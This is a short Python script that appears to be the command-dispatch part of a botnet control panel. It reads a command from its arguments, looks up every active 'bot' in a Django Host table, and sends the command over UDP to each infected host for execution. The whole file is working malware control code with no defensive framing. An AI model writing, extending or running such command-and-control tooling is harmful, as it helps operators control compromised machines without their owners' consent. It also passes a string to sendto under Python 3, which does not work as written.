#!/usr/bin/env python3

import socket
import sys
import logging

from __init__ import COMMAND_CENTER_HOST
from __init__ import COMMAND_CENTER_PORT


from command_center_panel.models.hosts import Host

data = ' '.join(sys.argv[1:])
logging.info('Sending command to execute: "%s"' % data)

try:
    for bot in Host.objects.filter(active=True):
        srv_addr = (COMMAND_CENTER_HOST, COMMAND_CENTER_PORT + 1)
        bot_addr = (bot.ip, bot.port)

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(srv_addr)

        logging.info('Command sent to %s', bot_addr)
        sock.sendto(data, bot_addr)
        sock.close()

except KeyboardInterrupt:
    sys.exit()
